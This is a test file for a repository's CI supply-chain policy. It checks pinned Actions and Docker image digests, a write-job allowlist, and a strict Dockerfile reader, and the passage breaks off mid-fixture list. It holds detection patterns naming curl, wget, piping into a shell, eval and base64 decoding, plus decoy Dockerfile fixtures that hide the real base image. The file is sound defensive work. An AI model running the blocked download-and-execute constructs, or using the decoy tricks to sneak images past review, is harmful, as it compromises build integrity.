// Supply-chain pins (#143, SECURITY.md): every GitHub Action is pinned to a full
// commit SHA with a version comment, and every Dockerfile base image to a digest.
//
// Write tokens versus third-party code (#194): a job whose GITHUB_TOKEN can write
// (packages, contents, id-token, security-events, ...) may only use the few
// actions below. Scanners, linters and setup actions run in read-only jobs. This
// is the lesson of the 2026 LiteLLM compromises: a scanner action that ran next to
// a publish credential was the way the credential was stolen.
//
// Workflows are read with the `yaml` package in strict mode (any parse error, a
// duplicate key or an alias bomb fails the test), aliases and merge keys are
// resolved, and the checks walk the parsed data, including local reusable
// workflows and local composite actions. The checks themselves are exercised
// against adversarial in-memory workflows at the bottom of this file.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, posix } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { runInNewContext } from "node:vm";
import { isMap, isScalar, parseDocument, visit } from "yaml";
import { bashPath, runBash } from "./bash-preflight.mjs";
import { APPROVED_RUNTIME, OTHER_BASE, hasWrite, jobCanWrite, jobPermissions, APPROVED_RUST, KNOWN_DOCKERFILES, RUNTIME_DOCKERFILES, SHA, actionName, containerImagesIn, findDockerfiles, jobsOf, parseStrict, readLocalFromRepo, repoFiles, root, stepsOf, toData, unknownDockerfileViolations, walk, wf, workflowsDir } from "./supply-chain/lib.mjs";

// An unsupported shell fails this file here, before any test or fixture runs (#380).
bashPath();

const FETCH_SCRIPT = ".github/scripts/fetch-verified.sh";

// Actions allowed in a job that has any `write` permission, explicit or inherited
// from the workflow level, from the caller of a reusable workflow, or from the
// repository default when nothing is declared. Keep this minimal: every entry must
// be used by a write job (checked below). Only these GitHub-owned actions are
// permitted: pinning or guarding a third-party action is not a write-token waiver.
// Tools that only need to read (Trivy, helm, kubeconform, cargo-deny, Node, Rust,
// the CodeQL bundle, ...) never belong here.
export const WRITE_JOB_ACTIONS = new Map([
  // GitHub-owned. Fetches the sources to build, the script to run or the SARIF file's repository.
  ["actions/checkout", "GitHub-owned; no network access beyond the repository"],
  // GitHub-owned. The upload job reads the SARIF file the read-only analysis job produced.
  ["actions/download-artifact", "GitHub-owned; hands the SARIF file from the read-only analysis job to the upload job"],
  // GitHub-owned. Uploading code-scanning results needs `security-events: write`.
  // It sends a SARIF file and downloads no CodeQL bundle (init and analyze, which
  // do, run in a read-only job).
  ["github/codeql-action/upload-sarif", "GitHub-owned; uploads the SARIF file the read-only analysis job wrote"],
]);

// Actions that download a tool at run time without a checksum that this repository
// pins. They are not used anywhere: install the tool with
// .github/scripts/fetch-verified.sh (the helm, kubeconform, Trivy and cosign steps,
// .github/actions/setup-node).
const UNVERIFIED_INSTALLERS = new Map([
  ["actions/setup-node", "downloads a floating Node release without a checksum; use ./.github/actions/setup-node"],
  ["azure/setup-helm", "does not verify the helm download; fetch it with .github/scripts/fetch-verified.sh"],
  ["aquasecurity/trivy-action", "installs Trivy through setup-trivy, whose checksum comes from the same release; fetch the pinned binary"],
  ["aquasecurity/setup-trivy", "the checksum comes from the same release; fetch the pinned binary"],
  ["sigstore/cosign-installer", "fetch the pinned cosign release with .github/scripts/fetch-verified.sh"],
]);

// ---- pinning ----

// Every `uses:` anywhere in the file, read from the syntax tree so comments and
// flow-style or aliased values are seen as they are.
export function pinViolations(text, file) {
  const doc = parseStrict(text, file);
  const out = [];
  visit(doc, {
    Pair(_, pair) {
      if (!isScalar(pair.key) || pair.key.value !== "uses") return;
      const v = pair.value;
      if (!isScalar(v) || typeof v.value !== "string") {
        out.push(`${file}: a 'uses' value is not a plain string (aliases and expressions cannot be checked)`);
        return;
      }
      const ref = v.value;
      if (ref.startsWith("./")) return; // local actions and reusable workflows
      if (ref.startsWith("docker://")) {
        if (!/@sha256:[0-9a-f]{64}$/.test(ref)) out.push(`${file}: ${ref} is not pinned by digest`);
        return;
      }
      if (!/@[0-9a-f]{40}$/.test(ref) || !(v.comment ?? "").trim()) out.push(`${file}: ${ref} needs a full commit SHA and a version comment`);
    },
  });
  return out;
}

// ---- permissions ----

// With no `permissions` anywhere the job gets the repository's default token,
// which can be read/write.
const isLocal = ref => ref.startsWith("./") || ref.startsWith("../");
const normalizeLocal = ref => ref.replace(/^\.\//, "").replace(/\/+$/, "");

function loadLocalAction(dir, readLocal) {
  for (const name of ["action.yml", "action.yaml"]) {
    const text = readLocal(`${dir}/${name}`);
    if (text !== null) return { file: `${dir}/${name}`, text };
  }
  return null;
}

// One reference used by a job that can write. Local composite actions are opened
// and their steps checked; local reusable workflows are checked as their own jobs
// (with the caller's permissions as the cap).
function checkRef(ref, kind, ctx, where, out, depth) {
  if (typeof ref !== "string") {
    out.push(`${where}: a 'uses' value is not a string`);
    return;
  }
  if (isLocal(ref)) {
    const path = normalizeLocal(ref);
    if (ref.startsWith("../") || path.split("/").includes("..")) {
      out.push(`${where}: ${ref} leaves the repository`);
    } else if (kind === "job") {
      if (!path.startsWith(".github/workflows/")) out.push(`${where}: ${ref} is not a local reusable workflow`);
    } else if (depth >= 5) {
      out.push(`${where}: ${ref} nests composite actions too deeply to check`);
    } else {
      const action = loadLocalAction(path, ctx.readLocal);
      if (!action) {
        out.push(`${where}: cannot read ${ref}`);
        return;
      }
      const data = toData(parseStrict(action.text, action.file));
      if (data.runs?.using === "docker" && String(data.runs.image ?? "").startsWith("docker://")) {
        out.push(`${where}: ${ref} runs ${data.runs.image}`);
      }
      for (const step of stepsOf(data.runs)) {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${where} via ${ref}`, out, depth + 1);
      }
    }
    return;
  }
  if (kind === "step" && ctx.allowed.has(actionName(ref))) return;
  out.push(`${where}: ${ref} is not on the write-job allowlist`);
}

// Violations for one workflow document: jobs that can write using anything off
// the allowlist. `callerPerms` is set when the workflow is called by another one.
export function workflowViolations(file, text, ctx, callerPerms, depth = 0) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const label = `${file}: job '${name}'${callerPerms !== undefined ? " (called)" : ""}`;
    if (canWrite) {
      if (job.uses !== undefined) checkRef(job.uses, "job", ctx, `${label} uses`, out, 0);
      stepsOf(job).forEach((step, i) => {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${label} step ${i + 1} (can write) uses`, out, 0);
      });
    }
    // A local reusable workflow's own jobs, under what this job grants it.
    if (typeof job.uses === "string" && isLocal(job.uses)) {
      const path = normalizeLocal(job.uses);
      const callee = path.startsWith(".github/workflows/") && depth < 5 ? ctx.readLocal(path) : null;
      if (callee === null) {
        if (canWrite) out.push(`${label}: cannot read ${job.uses}`);
      } else {
        const granted = canWrite ? jobPermissions(data, job, callerPerms) : {};
        out.push(...workflowViolations(path, callee, ctx, granted, depth + 1));
      }
    }
  }
  return out;
}

export function allWriteViolations(files, readLocal, allowed = WRITE_JOB_ACTIONS) {
  const ctx = { readLocal, allowed };
  const out = files.filter(f => f.file.includes("workflows/")).flatMap(f => workflowViolations(f.file, f.text, ctx));
  return [...new Set(out)];
}

// ---- Buildx ----

// docker/setup-buildx-action downloads an unverified Buildx when the runner has
// none, when `version` is set, or for the cloud driver. In a job that can write it
// must be preceded by a step that fails unless the runner already has Buildx, and
// it must set none of those inputs. Its BuildKit image is pinned by digest anywhere.
export function buildxViolations(file, text, callerPerms) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const steps = stepsOf(job);
    steps.forEach((step, i) => {
      if (typeof step.uses !== "string" || actionName(step.uses) !== "docker/setup-buildx-action") return;
      // The guard is the step immediately before, unconditional, failure-propagating,
      // and its whole script is the one command.
      const prev = steps[i - 1];
      const guarded = !!prev && typeof prev.run === "string" && prev.run.trim() === "docker buildx version"
        && prev.if === undefined && prev["continue-on-error"] === undefined && prev.shell === undefined;
      const where = `${file}: job '${name}' step ${i + 1}`;
      const w = step.with ?? {};
      if (w.version !== undefined) out.push(`${where}: sets 'version', which downloads Buildx`);
      if (String(w.driver ?? "docker-container") === "cloud") out.push(`${where}: the cloud driver downloads Buildx`);
      if (!/(^|[\s,])image=\S+@sha256:[0-9a-f]{64}(\s|,|$)/.test(String(w["driver-opts"] ?? ""))) out.push(`${where}: the BuildKit image is not pinned by digest`);
      if (canWrite && !guarded) out.push(`${where}: no earlier 'docker buildx version' step to rule out the download (job can write)`);
    });
  }
  return out;
}

// ---- run-time downloads ----

// Every run-time download goes through one first-party script, which checks a
// SHA-256 before the file is used. Any other mechanism in a run: block fails.
const DOWNLOADERS = [
  [/\bcurl\b/, "curl"],
  [/\bwget\b/, "wget"],
  [/\bgh\s+(release|run|extension|attestation|repo\s+clone)\b/, "gh download"],
  [/\bgh\s+api\b/, "gh api"],
  [/\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b/i, "PowerShell download"],
  [/\b(urllib|urlopen|http\.client|requests\.(get|post)|fetch\s*\(|https?\.get)\b/, "inline HTTP client"],
  [/\b(python3?|node|deno|bun|perl|ruby)\s+-[ec]\b/, "inline script"],
  [/\b(go install|cargo install|cargo binstall|pip3? install|brew install|npm (install|i) (-g|--global)|gem install)\b/, "package-manager tool install"],
];

// The staging rehearsal's readiness probe talks to the local stack, not the
// internet. Exempt only as a whole line, exactly (no extra arguments such as --next).
const LOCAL_PROBE = /^[ \t]*curl --fail --silent --show-error --cacert \.local\/staging\/local-ca\.crt https:\/\/localhost:18443\/health\/ready[ \t]*$/gm;

// `gh api` talks to the GitHub API with the job token (prune-dev-images deletes old
// dev package versions); it fetches no code. Exempt only these exact shapes, in that
// file: listing and deleting this repository's own container package versions.
const GH_API_FILES = new Set([".github/workflows/prune-dev-images.yml"]);
const GH_API_ALLOWED = [
  /gh api --paginate "\/users\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
  /gh api -X DELETE "\/users\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
];

// Constructs that hide what runs. The check above is a guard against accidental,
// unverified downloads; it cannot model arbitrary shell, so these are refused
// outright and anything cleverer is for review to catch (main is protected).
const OBSCURING = [
  [/\beval\b/, "eval"],
  [/\|\s*(sudo\s+)?(ba|z|da)?sh\b/, "piping into a shell"],
  [/\bbase64\s+(-d|--decode)\b/, "base64 decoding"],
  [/\bsource\s+<\(|\.\s+<\(/, "sourcing a process substitution"],
  [/--next\b/, "curl --next"],
];

export function downloadViolations(file, script) {
  const out = [];
  // Whole-line shell comments do not run.
  const joined = script.replace(/^[ \t]*#.*$/gm, "").replace(/\\\n\s*/g, " ");
  for (const [re, label] of OBSCURING) {
    if (re.test(joined)) out.push(`${file}: ${label} in a run step is not allowed`);
  }
  let text = joined.replace(LOCAL_PROBE, "");
  if (GH_API_FILES.has(file)) for (const re of GH_API_ALLOWED) text = text.replace(re, "");
  for (const [re, label] of DOWNLOADERS) {
    if (re.test(text)) out.push(`${file}: ${label} in a run step; use ${FETCH_SCRIPT} <https-url> <sha256> <dest>`);
  }
  // Calls of the script: literal https URL, literal 64-hex checksum.
  const call = /(?:^|[\s;&|(])(?:bash\s+|sh\s+|\.\/)?(\S*fetch-verified\.sh)(.*)/gm;
  for (const m of text.matchAll(call)) {
    const where = `${file}: ${m[0].trim().slice(0, 100)}`;
    if (m[1] !== FETCH_SCRIPT) out.push(`${where}: call the script as ${FETCH_SCRIPT}`);
    const args = m[2].match(/^\s+"?(https:\/\/[^\s"'$`\\{}()<>;|&]+)"?\s+"?([0-9a-f]{64})"?\s+("[^"]+"|'[^']+'|[^\s;&|]+)\s*(;;)?\s*$/);
    if (!args) out.push(`${where}: the URL and checksum must be literals (an https:// URL and 64 hex digits)`);
  }
  return out;
}

function runScripts(data) {
  const scripts = [];
  for (const [name, job] of jobsOf(data)) stepsOf(job).forEach((s, i) => typeof s.run === "string" && scripts.push([`job '${name}' step ${i + 1}`, s.run]));
  for (const [i, s] of stepsOf(data.runs).entries()) if (typeof s.run === "string") scripts.push([`step ${i + 1}`, s.run]);
  return scripts;
}

// ---- tests on the repository ----

test("every workflow and local action parses strictly", () => {
  const files = repoFiles();
  assert.ok(files.some(f => f.file.endsWith("image.yml")));
  for (const { file, text } of files) toData(parseStrict(text, file));
});

test("every workflow action is pinned to a commit SHA with a version comment", () => {
  const unpinned = repoFiles().flatMap(({ file, text }) => pinViolations(text, file));
  assert.deepEqual(unpinned, []);
});

test("every Dockerfile base image is pinned by digest", () => {
  const files = allDockerfiles();
  assert.ok(files.length >= 2, "expected to find the root and deploy/loadtest Dockerfiles");
  assert.deepEqual(files.flatMap(({ file, text }) => unpinnedDockerfileBases(file, text)), []);
});

const DIGEST_PINNED = /@sha256:[0-9a-f]{64}$/;

export function unpinnedDockerfileBases(file, text) {
  return dockerfileStages(file, text).filter(stage => !DIGEST_PINNED.test(stage.ref)).map(stage => `${file}:${stage.line} ${stage.ref}`);
}

// The stages of a Dockerfile as BuildKit's built-in frontend reads them (#485): the one
// reader behind every check of a Dockerfile in this file. It does not parse what the
// repository's Dockerfiles do not use; it throws, naming the file and line, so that no
// line can pose as a stage or hide one, and no image enters a stage except as its FROM:
// - any character other than printable ASCII, tab and LF (Go and JavaScript disagree on
//   which others are white space or end a line);
// - a `#!` line, or a comment shaped like a parser directive (`# escape=` moves the
//   continuation character, `# syntax=` replaces the parser), anywhere in the file;
// - inside a continued instruction, a blank line or a comment (BuildKit skips them and
//   continues) or a line starting with FROM; a line ending in two backslashes;
// - `<<` anywhere in an instruction once its continued lines are joined, as BuildKit
//   joins them before it looks for heredocs: a heredoc body is content, not instructions;
// - an instruction that is not in DOCKERFILE_INSTRUCTIONS (`//syntax=` also replaces the
//   parser; ADD fetches remote content; ONBUILD and MAINTAINER are not used);
// - a FROM that spans lines, or is not `FROM [--platform=<p>] <image> [AS <name>]` with a
//   literal image (BuildKit expands variables and removes quotes and escapes there);
// - a COPY or RUN flag that is not plain `--name[=value]` (BuildKit removes quotes and
//   escapes there too), and a `--from=` or `--mount=...,from=` that is not the name of an
//   earlier stage: no stage index (BuildKit resolves one for COPY only; a mount's `from=0`
//   is the image `0`) and no external image, which the checks of FROM lines never see.
// The instructions the two Dockerfiles use, and three more ordinary ones, which cannot
// name an image, fetch anything or change how the file is read.
const DOCKERFILE_INSTRUCTIONS = ["ARG", "CMD", "COPY", "ENTRYPOINT", "ENV", "EXPOSE", "FROM", "HEALTHCHECK", "LABEL", "RUN", "SHELL", "STOPSIGNAL", "USER", "VOLUME", "WORKDIR"];
const DOCKERFILE_RULES = ' (see "Dockerfile rules" in docs/verification.md)';

export function dockerfileStages(file, text) {
  const refuse = (line, why) => { throw new Error(`${file}:${line}: ${why}${DOCKERFILE_RULES}`); };
  const stages = [];
  for (const { line, last, joined } of dockerfileInstructions(text, refuse)) {
    const [keyword, ...words] = joined.trim().split(/[ \t]+/);
    const instruction = keyword.toUpperCase();
    if (!DOCKERFILE_INSTRUCTIONS.includes(instruction)) refuse(line, `'${keyword}' is not an allowed instruction (allowed: ${DOCKERFILE_INSTRUCTIONS.join(", ")})`);
    if (instruction === "FROM") {
      if (last !== line) refuse(line, "FROM must be on one line");
      stages.push({ line, ...fromArguments(words, why => refuse(line, why)) });
    } else if (instruction === "COPY" || instruction === "RUN") {
      for (const ref of flagSources(words, why => refuse(line, why))) {
        if (!isEarlierStage(ref, stages)) refuse(line, `'--from=' and a mount's 'from=' must name an earlier stage of this Dockerfile by name: no stage index and no external image, pinned by digest or not (found '${ref}')`);
      }
    }
  }
  return stages;
}

// Each instruction with its continued lines joined: the number of its first and last
// line, and its text. Comments and blank lines between instructions are dropped.
function dockerfileInstructions(text, refuse) {
  const lines = text.split("\n");
  lines.forEach((line, i) => {
    const bad = line.match(/[^\t\x20-\x7e]/u);
    if (bad) refuse(i + 1, `only printable ASCII, tab and LF are allowed in a Dockerfile (found U+${bad[0].codePointAt(0).toString(16).toUpperCase().padStart(4, "0")})`);
  });
  const blank = line => /^[ \t]*$/.test(line), comment = line => /^[ \t]*#/.test(line);
  const instructions = [];
  for (let i = 0; i < lines.length; i++) {
    const first = i + 1;
    if (blank(lines[i])) continue;
    if (comment(lines[i])) {
      if (/^[ \t]*#!/.test(lines[i])) refuse(first, "a '#!' line is not allowed");
      if (/^[ \t]*#[ \t]*[A-Za-z][A-Za-z0-9]*[ \t]*=/.test(lines[i])) refuse(first, "a comment shaped like a parser directive ('# name=value') is not allowed; reword the comment");
      continue;
    }
    let joined = "";
    for (;; i++) {
      const line = lines[i];
      if (i + 1 > first && /^[ \t]*FROM(?![^ \t])/i.test(line)) refuse(i + 1, "a continued line must not start with FROM");
      // The backslashes that end the line, before any trailing blanks. Counted from the
      // end: a pattern that may start anywhere is quadratic on a long run of backslashes.
      let end = line.length;
      while (line[end - 1] === " " || line[end - 1] === "\t") end--;
      let start = end;
      while (line[start - 1] === "\\") start--;
      if (start === end) { joined += line; break; }
      if (end - start > 1) refuse(i + 1, "a line must not end in more than one backslash");
      joined += line.slice(0, start);
      if (i + 1 === lines.length) break;
      if (blank(lines[i + 1]) || comment(lines[i + 1])) refuse(i + 2, "a continued line must not be blank or a comment");
    }
    if (joined.includes("<<")) refuse(first, "'<<' is not allowed in an instruction; heredocs cannot be told apart safely");
    instructions.push({ line: first, last: i + 1, joined });
  }
  return instructions;
}

// The platform, image and stage name of `FROM [--platform=<p>] <image> [AS <name>]`.
function fromArguments(words, refuse) {
  const flags = [];
  while (words[0]?.startsWith("--")) flags.push(words.shift());
  const platform = flags[0]?.match(/^--platform=(.+)$/)?.[1];
  const shape = flags.length <= 1 && (flags.length === 0 || platform) && (words.length === 1 || (words.length === 3 && /^as$/i.test(words[1])));
  if (!shape || !/^[A-Za-z0-9][A-Za-z0-9._\/:@-]*$/.test(words[0])) refuse("FROM must be written as 'FROM [--platform=<p>] <image> [AS <name>]' with a literal image (no variables, quotes or escapes)");
  return { platform, ref: words[0], name: words[2] };
}

// What the leading flags of a COPY or RUN take content from: the value of `--from=`, and of
// every `from=` field of every `--mount=` (the key in any case; BuildKit uses the last).
function flagSources(words, refuse) {
  const refs = [];
  for (const flag of words) {
    if (!flag.startsWith("--")) break;
    if (!/^--[a-z][a-z-]*(=[A-Za-z0-9._\/:@,=-]*)?$/.test(flag)) refuse(`a COPY or RUN flag must be written as '--name' or '--name=value' in plain characters: lower-case letters and '-' in the name; letters, digits and . _ / : @ , = - in the value (found '${flag}')`);
    if (flag.startsWith("--from=")) refs.push(flag.slice("--from=".length));
    if (flag.startsWith("--mount=")) refs.push(...flag.slice("--mount=".length).split(",").filter(field => /^from=/i.test(field)).map(field => field.slice("from=".length)));
  }
  return refs;
}

// Whether `ref` is the name, in any case, of a stage before the current one (the last in
// `stages`); in real builds `--from=BUILD` and a mount's `from=BUILD` find `AS Build`.
function isEarlierStage(ref, stages) {
  return stages.slice(0, -1).some(stage => stage.name?.toLowerCase() === ref.toLowerCase());
}


export function runtimeBaseViolations(sources) {
  const out = [];
  if (JSON.stringify(sources.map(s => s.file).sort()) !== JSON.stringify([...RUNTIME_DOCKERFILES].sort())) out.push("expected exactly the production and load-test Dockerfiles");
  for (const { file, text } of sources) {
    let stages;
    try { stages = dockerfileStages(file, text ?? ""); } catch (error) { out.push(error.message); continue; }
    const distroless = stages.filter(stage => stage.ref.startsWith("gcr.io/distroless/"));
    if (distroless.length !== 1 || distroless[0].platform || distroless[0].ref !== APPROVED_RUNTIME || stages.at(-1)?.ref !== APPROVED_RUNTIME) out.push(`${file}: expected one distroless final FROM using the approved Debian 13 index`);
  }
  return out;
}

for (const file of RUNTIME_DOCKERFILES) {
  test(`${file} uses the approved Debian 13 runtime index (#377)`, () => {
    assert.deepEqual(runtimeBaseViolations(RUNTIME_DOCKERFILES.map(path => ({
      file: path, text: path === file ? readLocalFromRepo(path) : `FROM ${APPROVED_RUNTIME}\n`,
    }))), []);
  });
}

test("fixtures: runtime policy rejects independent pin regressions and incomplete inventories (#377)", () => {
  const good = RUNTIME_DOCKERFILES.map(file => ({ file, text: `FROM ${APPROVED_RUNTIME}\n` }));
  assert.deepEqual(runtimeBaseViolations(good), []);
  const mutants = [
    ["old vulnerable pin", "FROM gcr.io/distroless/cc-debian12:nonroot@sha256:9dac0a79194e45a7da0158a9c6da57b217585af0786db3845d1f0ec1a0dd182f\n"],
    ["mutable tag", "FROM gcr.io/distroless/cc-debian13:nonroot\n"],
    ["unapproved digest, including platform children", `FROM gcr.io/distroless/cc-debian13:nonroot@sha256:${"a".repeat(64)}\n`],
    ["missing runtime", "FROM scratch\n"],
    ["duplicate runtime", `FROM ${APPROVED_RUNTIME}\nFROM ${APPROVED_RUNTIME}\n`],
    ["runtime not final", `FROM ${APPROVED_RUNTIME}\nFROM scratch\n`],
    ...["linux/amd64", "linux/arm64", "$BUILDPLATFORM", "$TARGETPLATFORM"].map(platform => [
      `runtime platform override ${platform}`, `FROM --platform=${platform} ${APPROVED_RUNTIME}\n`,
    ]),
  ];
  for (const file of RUNTIME_DOCKERFILES) {
    for (const [label, text] of mutants) {
      const violations = runtimeBaseViolations(good.map(source => source.file === file ? { file, text } : source));
      assert.equal(violations.length, 1, `${file}: ${label}`);
      assert.ok(violations[0].startsWith(`${file}:`), `${file}: ${label} must flag the mutated file`);
    }
  }
  assert.ok(runtimeBaseViolations([]).length > 0, "empty inventory");
  for (const source of good) {
    assert.ok(runtimeBaseViolations([source]).length > 0, `missing peer of ${source.file}`);
    assert.ok(runtimeBaseViolations([...good, source]).length > 0, `duplicate ${source.file}`);
  }
});

test("the Docker PostgreSQL fixture uses exactly one approved digest-pinned image (#369)", () => {
  // Read source only: importing this file would run its Docker lifecycle hooks.
  const text = readLocalFromRepo("tests/container-image.test.mjs");
  assert.notEqual(text, null, "the Docker runtime contract test must exist");
  assert.ok(!text.includes("POSTGRES_PASSWORD="), "fixture password must travel in the Docker client environment, never argv/error diagnostics");
  const refs = text.match(/mirror\.gcr\.io\/library\/postgres[^\s"'`]*/g) ?? [];
  assert.deepEqual(refs, [
    "mirror.gcr.io/library/postgres@sha256:858bb5e98eed02eb8cafbcdc007f9a65d1b613972028944a8ec2133ccaf80d27",
  ], "expected exactly one PostgreSQL fixture reference, using the approved PostgreSQL 17 digest (not a mutable tag)");
});

test("staging verifier images use the approved literal digest pins in both workflows, Compose defaults and examples (#373)", () => {
  const pins = [
    ["STAGING_POSTGRES_IMAGE", "postgres", "mirror.gcr.io/library/postgres@sha256:858bb5e98eed02eb8cafbcdc007f9a65d1b613972028944a8ec2133ccaf80d27"],
    ["STAGING_CADDY_IMAGE", "ingress", "mirror.gcr.io/library/caddy@sha256:d8542f48d34a9cf4e4c11a478865229840e87e4c96ea3f439101f31a5d35f75f"],
  ];
  const actual = [];
  const expected = [];
  // Enumerate the required sites, rather than scanning only references that happen
  // to exist: deleting a job, field, default or example must not make this pass.
  for (const [file, job] of [[".github/workflows/image.yml", "verify"], [".github/workflows/ci.yml", "staging-image"]]) {
    const data = toData(parseStrict(readLocalFromRepo(file), file));
    for (const [variable, , pin] of pins) {
      const location = `${file}: jobs.${job}.env.${variable}`;
      actual.push([location, data.jobs[job].env[variable]]);
      expected.push([location, pin]);
    }
  }
  const composeFile = "deploy/staging/compose.yaml";
  const compose = toData(parseStrict(readLocalFromRepo(composeFile), composeFile));
  const exampleFile = "deploy/staging/staging.env.example";
  const exampleLines = readLocalFromRepo(exampleFile).split("\n");
  for (const [variable, service, pin] of pins) {
    const location = `${composeFile}: services.${service}.image`;
    actual.push([location, compose.services[service].image]);
    expected.push([location, `\${${variable}:-${pin}}`]);
    const prefix = `# ${variable}=`;
    // Exact singleton equality rejects missing, duplicate, floating or substituted examples.
    actual.push([`${exampleFile}: ${variable}`, exampleLines.filter(line => line.startsWith(prefix)).map(line => line.slice(prefix.length))]);
    expected.push([`${exampleFile}: ${variable}`, [pin]]);
  }
  assert.deepEqual(actual, expected);
});

// ---- Rust toolchain pin (#354) ----
//
// rust-toolchain.toml, every Rust build stage in every Dockerfile, and every
// `dtolnay/rust-toolchain` step's `toolchain:` input must all name the same exact version,
// and nothing in a workflow may override the pin at run time. A floating channel (`stable`,
// `beta`, `nightly`, with or without a date) or an override (`RUSTUP_TOOLCHAIN`, `rustup
// default|override|toolchain install`, `cargo +<toolchain>`) anywhere defeats the whole
// point: CI would no longer compile with the same compiler as local gates and release
// builds (PR #348's local-pass/CI-fail divergence).

const FLOATING_RUST_CHANNEL = /^(stable|beta|nightly)(-\d{4}-\d{2}-\d{2})?$/i;

// Minimal, strict parser for rust-toolchain.toml's [toolchain] table only (there is no TOML
// dependency in this repository). It refuses anything the file does not actually use
// (a second [toolchain] table, unquoted/multi-line values, an unexpected key, a
// non-flat-array components/targets value) instead of silently ignoring it.
export function parseToolchainToml(text) {
  const lines = text.split("\n").map(l => l.replace(/#.*$/, "").trim()).filter(Boolean);
  const start = lines.indexOf("[toolchain]");
  if (start === -1) throw new Error("rust-toolchain.toml has no [toolchain] table");
  if (lines.indexOf("[toolchain]", start + 1) !== -1) throw new Error("rust-toolchain.toml has more than one [toolchain] table");
  const table = {};
  for (let i = start + 1; i < lines.length && !lines[i].startsWith("["); i++) {
    const m = lines[i].match(/^(\w+)\s*=\s*(.+)$/);
    if (!m) throw new Error(`rust-toolchain.toml: unparseable line in [toolchain]: ${lines[i]}`);
    const [, key, raw] = m;
    if (key in table) throw new Error(`rust-toolchain.toml: duplicate key in [toolchain]: ${key}`);
    if (key === "channel" || key === "profile") {
      const sm = raw.match(/^"([^"]*)"$/);
      if (!sm) throw new Error(`rust-toolchain.toml: ${key} must be a plain quoted string, got: ${raw}`);
      table[key] = sm[1];
    } else if (key === "components" || key === "targets") {
      // Linear (no nested optional quantifiers; CodeQL js/redos): items are
      // separated by a required comma, with one optional trailing comma.
      const am = raw.match(/^\[\s*(?:("[^"]*"(?:\s*,\s*"[^"]*")*)\s*(?:,\s*)?)?\]$/);
      if (!am) throw new Error(`rust-toolchain.toml: ${key} must be a flat array of quoted strings, got: ${raw}`);
      table[key] = [...(am[1] ?? "").matchAll(/"([^"]*)"/g)].map(mm => mm[1]);
    } else {
      throw new Error(`rust-toolchain.toml: unexpected key in [toolchain]: ${key}`);
    }
  }
  if (!("channel" in table)) throw new Error("rust-toolchain.toml: [toolchain] has no channel");
  return table;
}

// ---- Dockerfile readers versus BuildKit (#485) ----
//
// Every check here that reads a Dockerfile must see the stages BuildKit builds, not
// lines that merely look like `FROM`. Each fixture below was a way to show one of the
// checks a stage that is not built, or to hide one that is; `docker build` accepted the
// heredoc, continuation, lone-backslash, `# escape=`, split-keyword, U+0085 and U+2028
// forms and built from the other base (verified by hand with Docker 29.1.3). All three readers must
// refuse each fixture, for the stated reason.
const WRONG_RUST = `mirror.gcr.io/library/rust:1.98.0-bookworm@sha256:${"c".repeat(64)}`;
// The decoy: the stage that is really built last uses another base, and the approved
// line follows it as something that is not an instruction.
const decoy = (open, close = "") => `FROM ${OTHER_BASE} AS real\n${open}\nFROM ${APPROVED_RUNTIME} AS runtime\n${close}`;
// An approved final stage after a build stage, then `body` as line 3.
const twoStages = body => `FROM ${OTHER_BASE} AS build\nFROM ${APPROVED_RUNTIME} AS runtime\n${body}\n`;
const BY_NAME = /must name an earlier stage of this Dockerfile by name: no stage index and no external image, pinned by digest or not/;
const PLAIN_FLAG = /a COPY or RUN flag must be written as '--name' or '--name=value' in plain characters: lower-case letters and '-' in the name; letters, digits and \. _ \/ : @ , = - in the value/;
const REFUSED_DOCKERFILES = [
  // Heredocs: the body is file or script content, never instructions.
  ["the issue's COPY heredoc decoy", decoy("COPY <<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a RUN heredoc decoy", decoy("RUN <<EOF", "EOF\n"), /heredoc/],
  ["an ADD heredoc decoy", decoy("ADD <<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a tab-stripping <<- heredoc decoy", decoy("COPY <<-EOF /decoy.txt", "\tEOF\n"), /heredoc/],
  ["a double-quoted heredoc delimiter", decoy('COPY <<"EOF" /decoy.txt', "EOF\n"), /heredoc/],
  ["a single-quoted heredoc delimiter", decoy("COPY <<'EOF' /decoy.txt", "EOF\n"), /heredoc/],
  ["a quoted <<- heredoc delimiter", decoy("RUN <<-'EOF'", "\tEOF\n"), /heredoc/],
  ["a heredoc after a flag", decoy("COPY --chmod=0444 <<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a heredoc in the middle of a RUN", decoy("RUN cat <<EOF >/decoy.txt", "EOF\n"), /heredoc/],
  ["a heredoc opened on a continued line", decoy("RUN true \\\n  && cat <<EOF", "EOF\n"), /heredoc/],
  ["two heredocs on one line", decoy("COPY <<A <<B /decoys/", "A\nB\n"), /heredoc/],
  ["an ONBUILD heredoc", decoy("ONBUILD COPY <<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a lower-case copy heredoc", decoy("copy <<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a heredoc with no decoy in it", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY <<EOF /motd\nhello\nEOF\n`, /heredoc/],
  // Line continuations: the next line belongs to the same instruction.
  ["a FROM line continued from CMD", decoy("CMD true \\"), /continued line/],
  ["a lower-case from line continued from CMD", `FROM ${OTHER_BASE} AS real\nCMD true \\\n  from ${APPROVED_RUNTIME} AS runtime\n`, /continued line/],
  ["a FROM line continued past trailing blanks", decoy("CMD true \\ \t"), /continued line/],
  ["a FROM line continued over a comment", decoy("CMD true \\\n# skipped by BuildKit"), /continued line/],
